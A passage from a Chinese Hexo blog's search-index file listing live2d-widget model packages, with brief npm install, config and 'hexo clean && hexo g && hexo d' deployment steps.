title="模块列表"></a>模块列表</h2><ul><li>live2d-widget-model-chitose</li><li>live2d-widget-model-epsilon2_1</li><li>live2d-widget-model-gf</li><li>live2d-widget-model-haru/01 (use npm i1nstall –save live2d-widget-model-haru)</li><li>live2d-widget-model-haru/02 (use npm install –save live2d-widget-model-haru)</li><li>live2d-widget-model-haruto</li><li>live2d-widget-model-hibiki</li><li>live2d-widget-model-hijiki</li><li>live2d-widget-model-izumi</li><li>live2d-widget-model-koharu</li><li>live2d-widget-model-miku</li><li>live2d-widget-model-ni-j</li><li>live2d-widget-model-nico</li><li>live2d-widget-model-nietzsche</li><li>live2d-widget-model-nipsilon</li><li>live2d-widget-model-nito</li><li>live2d-widget-model-shizuku</li><li>live2d-widget-model-tororo</li><li>live2d-widget-model-tsumiki</li><li>live2d-widget-model-unitychan</li><li>live2d-widget-model-wanko</li><li>live2d-widget-model-z16<br>安装 <pre class=" language-bash"><code class="language-bash"><span class="token function">npm</span> <span class="token function">install</span> 模型的包名</code></pre>修改_config.yml<pre class=" language-bash"><code class="language-bash">use <span class="token keyword">:</span> 安装的模块名称</code></pre><pre class=" language-bash"><code class="language-bash">hexo clean <span class="token operator">&amp;&amp;</span> hexo g <span class="token operator">&amp;&amp;</span> hexo d</code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 站点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> live2d </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
